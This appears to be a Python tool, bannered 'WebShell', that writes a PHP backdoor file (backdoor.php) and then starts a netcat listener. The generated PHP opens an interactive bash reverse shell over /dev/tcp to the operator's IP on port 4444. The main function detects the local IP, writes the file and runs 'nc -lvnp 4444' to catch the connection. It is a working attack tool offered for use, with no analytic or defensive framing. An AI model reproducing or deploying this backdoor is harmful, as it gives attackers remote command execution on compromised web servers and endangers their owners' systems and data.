import os
import subprocess
import socket
from termcolor import colored

banner = """
{blue} __      __      ___.     _________ ___ ______________.____    .____     
/  \    /  \ ____\_ |__  /   _____//   |   \_   _____/|    |   |    |    
\   \/\/   // __ \| __ \ \_____  \/    ~    \    __)_ |    |   |    |    
 \        /\  ___/| \_\ \/        \    Y    /        \|    |___|    |___ 
  \__/\  /  \___  >___  /_______  /\___|_  /_______  /|_______ \_______ \\
       \/       \/    \/        \/       \/        \/         \/       \/{reset}
""".format(
    blue=colored('', 'blue'),
    reset=colored('', 'white')
)

version = "1.0"
author = "G4UR4V007"

def get_system_ip():
    """Get the system's local IP address by connecting to an external IP."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(colored(f"Error getting system IP: {e}", 'red'))
        return None

def generate_backdoor(ip, port):
    """Generate the PHP reverse shell backdoor."""
    backdoor_code = f"""
    <?php
    $shell = '/bin/bash';
    $args = '-c';
    $cmd = 'bash -i >& /dev/tcp/{ip}/{port} 0>&1';
    exec($shell . ' ' . $args . ' ' . $cmd);
    ?>
    """
    return backdoor_code

def generate_netcat_command(ip, port):
    """Generate the netcat command to listen for reverse shell."""
    return f'nc -lvnp {port}'

def main():
    print(banner)
    print(colored(f"Author: {author}", 'green'))
    print(colored(f"Version: {version}", 'green'))
    
    ip = get_system_ip()
    if not ip:
        return  
    
    
    port = 4444
    backdoor_code = generate_backdoor(ip, port)
    backdoor_file = 'backdoor.php'
    
    try:
        with open(backdoor_file, 'w') as f:
            f.write(backdoor_code)
        print(colored(f"Backdoor file generated: {backdoor_file}", 'yellow'))
    except IOError as e:
        print(colored(f"Error creating backdoor file: {e}", 'red'))
        return
    
    
    print(colored(f"IP: {ip}", 'blue'))
    print(colored(f"Port: {port}", 'blue'))

    netcat_command = generate_netcat_command(ip, port)
    print(colored(f"Netcat server is starting with the following command:", 'green'))
    print(colored(netcat_command, 'cyan'))

    try:
        subprocess.run(['nc', '-lvnp', str(port)], check=True)
    except FileNotFoundError:
        print(colored("Error: netcat is not installed or not found in your PATH.", 'red'))
    except Exception as e:
        print(colored(f"Error running netcat: {e}", 'red'))

if __name__ == '__main__':
    main()
